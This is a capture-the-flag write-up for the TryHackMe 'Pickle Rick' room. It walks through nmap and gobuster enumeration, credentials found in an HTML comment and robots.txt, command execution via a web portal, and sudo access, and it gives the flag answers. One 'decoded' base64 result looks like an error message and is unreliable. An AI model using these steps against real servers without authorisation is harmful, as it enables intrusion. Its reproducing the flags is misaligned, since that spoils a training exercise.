# Room: picklerick

## General Info
- **Room link:** [Picle Rick](https://tryhackme.com/room/picklerick)


## Description

A Rick and Morty CTF. Help turn Rick back into a human!
This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.

## Provided Files / Links
- [x] Target Machine IP (10.10.203.145)

## Enumeration / Recon
- Ports Enumeration

`nmap -sV 10.10.203.145`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

  - Notes:
    - ssh and http are open

- Website visit

After a quick look at the website, I found this comment in the HTML:
```
<!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

- Directories Enumeration

`gobuster dir -u http://10.10.203.145 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt -o gobuster.txt`

```
/login.php            (Status: 200) [Size: 882]
/index.html           (Status: 200) [Size: 1062]
/.htaccess            (Status: 403) [Size: 278]
/robots.txt           (Status: 200) [Size: 17]
/.                    (Status: 200) [Size: 1062]
/.html                (Status: 403) [Size: 278]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/.php                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htm                 (Status: 403) [Size: 278]
/.htpasswds           (Status: 403) [Size: 278]
/.htgroup             (Status: 403) [Size: 278]
/wp-forum.phps        (Status: 403) [Size: 278]
/.htaccess.bak        (Status: 403) [Size: 278]
/.htuser              (Status: 403) [Size: 278]
/.ht                  (Status: 403) [Size: 278]
/.htc                 (Status: 403) [Size: 278]
/denied.php           (Status: 302) [Size: 0] [--> /login.php]
```

In robots.txt, there is a string whick looks like a password: `Wubbalubbadubdub`.

I went to the /login.php and logged with **R1ckRul3s:Wubbalubbadubdub**.

### Logged in session

in the HTML, I find this comment:

```
<!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->
```

Decoding the base64 string => `The all-zero group char cannot appear in the alphabet`.

I started trying some commands.

`sudo -l`

```
User www-data may run the following commands on ip-10-10-203-145:
    (ALL) NOPASSWD: ALL
```

`ls -la`:

```
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```

`less Sup3rS3cretPickl3Ingred.txt` => **mr. meeseek hair** (which is the first flag)

`less clue.txt` => `Look around the file system for the other ingredient.`

`ls -la /home`:
```
drwxrwxrwx  2 root   root   4096 Feb 10  2019 rick
drwxr-xr-x  5 ubuntu ubuntu 4096 Jul 11  2024 ubuntu
```

`ls -la /home/rick`:
```
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
```

`less /home/rick/"second ingredients"` => **1 jerry tear** (which is the second flag)

I found the 3rg ingredient in the /root directory:

`sudo less /root/3rd.txt` => **fleeb juice**